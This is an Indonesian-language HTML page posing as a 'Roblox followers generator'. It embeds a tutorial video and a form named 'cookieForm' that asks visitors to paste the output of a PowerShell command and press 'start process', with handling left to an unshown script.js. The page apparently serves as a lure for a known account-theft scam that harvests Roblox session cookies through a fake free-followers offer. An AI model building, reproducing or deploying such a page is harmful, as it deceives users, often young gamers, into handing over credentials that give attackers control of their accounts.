<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GENERATOR FOLLOWERS ROBLOX</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-gray-900 via-purple-900 to-violet-900 min-h-screen flex items-center justify-center p-4">
    <div class="bg-gray-800 bg-opacity-90 backdrop-blur-lg p-8 rounded-2xl shadow-2xl w-full max-w-2xl border border-gray-700">
        <div class="text-center mb-8">
            <h1 class="text-4xl font-bold text-white mb-2">GENERATOR FOLLOWERS ROBLOX</h1>
        </div>

        <!-- !!! SECTION VIDEO TUTORIAL BARU !!! -->
        <div class="mb-8">
            <h2 class="text-2xl font-bold text-white mb-4 text-center">Cara Penggunaan / Tutorial</h2>
            <div class="relative w-full" style="padding-bottom: 56.25%; /* 16:9 Aspect Ratio */">
                <iframe 
                    class="absolute top-0 left-0 w-full h-full rounded-lg shadow-lg" 
                    src="https://www.youtube.com/embed/ymyJ5qnuGNM" 
                    title="YouTube video player" 
                    frameborder="0" 
                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                    referrerpolicy="strict-origin-when-cross-origin" 
                    allowfullscreen>
                </iframe>
            </div>
        </div>

        <form id="cookieForm" class="space-y-6">
            <div>
                <textarea id="cookieInput" name="cookie" rows="6" required
                    class="w-full px-4 py-3 bg-gray-700 bg-opacity-50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    placeholder="Paste output PowerShell Anda di sini..."></textarea>
            </div>
            <button type="submit"
                class="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white font-bold py-3 px-4 rounded-lg hover:from-purple-700 hover:to-pink-700 transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-50">
                Mulai Proses
            </button>
        </form>

        <div id="status" class="mt-8 text-center text-lg font-semibold p-4 bg-gray-700 bg-opacity-70 rounded-lg border shadow-inner transition-opacity duration-500 ease-out opacity-0">
            <!-- Status akan muncul di sini -->
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
